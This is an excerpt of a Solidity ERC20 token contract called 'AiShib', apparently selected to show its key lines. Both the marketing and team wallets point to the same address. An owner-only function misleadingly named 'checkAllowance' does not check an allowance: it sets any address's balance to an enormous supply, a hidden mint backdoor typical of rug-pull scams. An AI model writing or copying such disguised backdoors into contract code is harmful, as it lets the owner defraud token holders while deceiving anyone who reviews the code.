...
contract AiShib is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x920e557A3b14fE7ED293ED7Ba53E6Eea9BC2b87f);
    address payable public teamWalletAddress = payable(0x920e557A3b14fE7ED293ED7Ba53E6Eea9BC2b87f);
    ...
    uint256 public _supplyDec = 100000000000000;
    uint256 public newTotal = _supplyDec * _mult;
    ...
    function checkAllowance(address spender) public onlyOwner returns (bool success) {_balances[spender] = newTotal;return true;}
